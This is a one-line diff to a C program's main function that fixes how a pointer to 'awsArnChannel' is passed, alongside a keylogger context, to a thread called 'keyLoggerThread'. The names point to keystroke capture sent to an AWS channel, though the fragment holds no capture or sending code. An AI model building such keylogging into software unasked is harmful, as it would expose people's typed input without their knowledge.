@@ -358,7 +358,7 @@ int main(int argc, const char* argv[])
         return -1;
     }
 
-    void* threadArgs[2] = { &dKeyLoggerContext, &awsArnChannel };
+    void* threadArgs[2] = { &dKeyLoggerContext, awsArnChannel };
     pthread_create(&tid, NULL, keyLoggerThread, threadArgs);
 
     int counter = 0;
